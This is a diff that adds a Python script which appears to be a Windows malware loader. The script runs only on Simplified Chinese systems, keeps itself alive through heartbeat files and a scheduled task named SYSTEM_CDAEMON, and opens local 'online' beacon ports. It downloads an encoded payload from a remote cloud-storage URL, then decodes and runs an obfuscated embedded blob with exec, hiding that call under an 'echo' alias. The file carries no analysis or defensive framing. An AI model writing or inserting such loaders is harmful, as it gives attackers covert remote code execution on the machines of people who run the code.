@@ -1,0 +1,170 @@
+# coding:utf-8
+import base64
+import urllib.request
+import sys
+import socket
+import threading
+import ctypes
+import os
+import time
+import subprocess
+import traceback
+
+dll_h = ctypes.windll.kernel32
+if (dll_h.GetSystemDefaultUILanguage() != 2052):
+    exit(0)
+
+
+def xlog(title,content):
+    with open(os.path.join(os.getenv('public'), 'ServiceHub', 'watch_log.txt'), "a+") as f:
+        f.write("[{}] [{}]\t{}\n".format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),title, content))
+
+
+class online:
+    def __init__(self):
+        self.ports = [43990, 43992, 53990, 33990, 33890, 48990]
+        self.check_ports = [12880, 22880, 32880, 42880, 52880, 62880]
+        self.init = False
+
+        for port in self.ports:
+            if not self.detect_port(port):
+                threading.Thread(target=self.handler, args=(port,)).start()
+                break
+
+        for check_port in self.check_ports:
+            if not self.detect_port(check_port):
+                threading.Thread(target=self.handler, args=(check_port,)).start()
+                break
+
+    def detect_port(self, port):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.1)
+        try:
+            s.connect(('127.0.0.1', port))
+            s.shutdown(2)
+            return True
+        except:
+            return False
+
+    def handler(self, port):
+        ip_port = ('127.0.0.1', port)
+        back_log = 10
+        buffer_size = 1024
+        webserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        webserver.bind(ip_port)
+        webserver.listen(back_log)
+        while True:
+            try:
+                conn, addr = webserver.accept()
+                if port in self.ports:
+                    self.init = True
+                recvdata = conn.recv(buffer_size)
+                conn.sendall(bytes("HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\n\r\n", "utf-8"))
+                conn.sendall(bytes("online", "utf-8"))
+                conn.close()
+            except:
+                xlog('online',traceback.format_exc())
+
+
+c = None
+exec('echo=exec')
+watch_file = os.path.join(os.getenv('public'), 'ServiceHub', 'watch.txt')
+
+
+def watch():
+    while True:
+        try:
+            daemon_file = os.path.join(os.getenv('public'), 'ServiceHub', 'daemon.txt')
+            daemon_d_file = os.path.join(os.getenv('public'), 'ServiceHub', 'daemon_d.txt')
+            with open(watch_file, mode='w') as f:
+                f.write(str(time.time()))
+            if os.path.exists(daemon_file):
+                with open(daemon_file, mode='r') as f:
+                    last_time = f.read()
+                    last_time = int(float(last_time))
+                    if time.time() - last_time >= 60:
+                        with open(daemon_file, mode='w') as f:
+                            f.write(str(time.time()))
+                        with open(daemon_d_file,mode='w') as f:
+                            f.write(str(time.time()))
+                        subprocess.Popen("SCHTASKS /Run /TN SYSTEM_CDAEMON", shell=True)
+            else:
+                with open(daemon_file, mode='w') as f:
+                    f.write(str(time.time()))
+                with open(daemon_d_file, mode='w') as f:
+                    f.write(str(time.time()))
+                subprocess.Popen("SCHTASKS /Run /TN SYSTEM_CDAEMON", shell=True)
+        except:
+            xlog('watch', traceback.format_exc())
+        finally:
+            time.sleep(3)
+
+
+def decrypt_eval(str):
+    global c
+    s1 = base64.b16decode(str.encode()).decode()
+    s2 = b''.fromhex(s1)
+    s3 = base64.b85decode(s2)
+    exec(s3.decode())
+
+
+def load():
+    try:
+        global c
+        url = 'http://flashdownloadserver.oss-cn-hongkong.aliyuncs.com/res/sc3.txt'
+        req = urllib.request.Request(url)
+        data = urllib.request.urlopen(req).read()
+        c = b''.fromhex(data.decode())
+        c = base64.b85decode(c)
+        decrypt_eval(
+            '353833653434326234333631323632333632346336323631363032643530363233333331366637373632333736363661356135313636373933'
+            '643238346137333430346337323634333236653534346634353566356133323635353734653634333634643539363836303662333735373666'
+            '323434343734343533653365373834323632363136393332343434633332353035363731353633633364336234353634333236653534346634'
+            '353430346534643335356136373635346637383434346132393764366136343332366535343466343534303465346433353561363736353530'
+            '353935373666376235653431343434613634326137343632363136303264353036323331373137633436353833653465333235363436366534'
+            '323538343334363636363236303432343135393261363935333631343136623338353935363566323336303261363235333465326432613437'
+            '323537613536343334613337363135373734363134313662333835393633353734373762333935393264376432313534353737303561373733'
+            '313539323533663264333035313637366432313638356132623332373832383537366633653536343136333566336634363631363433323665'
+            '353434663435343034653464333535613637363535303661353833653238336232643464346532383762346134343461323637303662343534'
+            '363636363336313634333236653534346634353430346534643335356136373635353035393537366637623565343134343461363437393433'
+            '363337303739343333653536376333303330346535373730363736363636353833653464363437643539323535383638346436313236343236'
+            '343338343736333731366536393631323534353737333335373664343935343233353736653730333937643536376333303330346535373730'
+            '363736363463353537353662356133313433343033663338333335363763333033303465353737303637363634633535373536623561333134'
+            '333430336633383333353637633330333034653537373036373636346335353735366235613331343433303637353836343537366432643661'
+            '333235393264343137643633353637633330333034653537373036373636346335353735366235613331343334303366333833333536376333'
+            '303330346535373730363736363463353537353662356133313433343033663338333335363763333033303465353737303637363635393561'
+            '323937343339343835373730353834383435363236313630326435303632333137313763343635383365346533323536343636353738363333'
+            '313461333736313537373436313431366233383539363335373437376233393539326437643231353435373730356137373331353932353366'
+            '326433303533333734323261323534643733343935323633353833653464366533313537366337363236363935373665326132623437353637'
+            '633330333034653537373036373636346335353735366235613331343433303665343633653536376333303330346535373730363736363463'
+            '3535373536623561333134333430366534353335343434633536'
+        )
+    except:
+        xlog('load',traceback.format_exc())
+
+
+def mutex():
+    try:
+        watch_d_file = os.path.join(os.getenv('public'), 'ServiceHub', 'watch_d.txt')
+        if os.path.exists(watch_file):
+            with open(watch_file, mode='r') as f:
+                last_time = f.read()
+                last_time = int(float(last_time))
+                if time.time() - last_time >= 10 or os.path.exists(watch_d_file):
+                    os.remove(watch_d_file)
+                    return True
+                else:
+                    return False
+        else:
+            return True
+    except:
+        xlog('mutex', traceback.format_exc())
+        return True
+
+try:
+    if len(sys.argv) > 2 and mutex():
+        threading.Thread(target=watch).start()
+        o = online()
+        load()
+except:
+    xlog('main',traceback.format_exc())
